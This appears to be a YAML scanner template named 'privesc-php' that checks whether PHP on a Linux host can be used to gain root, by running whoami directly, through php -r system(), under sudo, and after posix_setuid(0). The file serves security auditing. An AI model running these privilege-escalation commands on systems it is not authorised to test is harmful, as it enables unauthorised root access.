code:
- engine:
  - sh
  - bash
  source: 'whoami

    '
- engine:
  - sh
  - bash
  source: 'php -r ''system("whoami");''

    '
- engine:
  - sh
  - bash
  source: 'sudo php -r ''system("whoami");''

    '
- engine:
  - sh
  - bash
  matchers:
  - negative: true
    part: code_1_response
    type: word
    words:
    - root
  - condition: or
    dsl:
    - contains(code_2_response, "root")
    - contains(code_3_response, "root")
    - contains(code_4_response, "root")
    type: dsl
  matchers-condition: and
  source: 'php -r "posix_setuid(0); system("whoami");"

    '
id: privesc-php
info:
  author: daffainfo
  description: 'PHP is a popular server-side scripting language that is widely used
    for web development. It is known for its ease of use, flexibility, and broad support
    for web frameworks and content management systems. PHP is commonly used to create
    dynamic web pages, process form data, manage sessions, and interact with databases.

    '
  metadata:
    max-request: 4
    verified: true
  name: PHP - Privilege Escalation
  reference:
  - https://gtfobins.github.io/gtfobins/php/
  severity: high
  tags: code,linux,php,privesc,local
self-contained: true
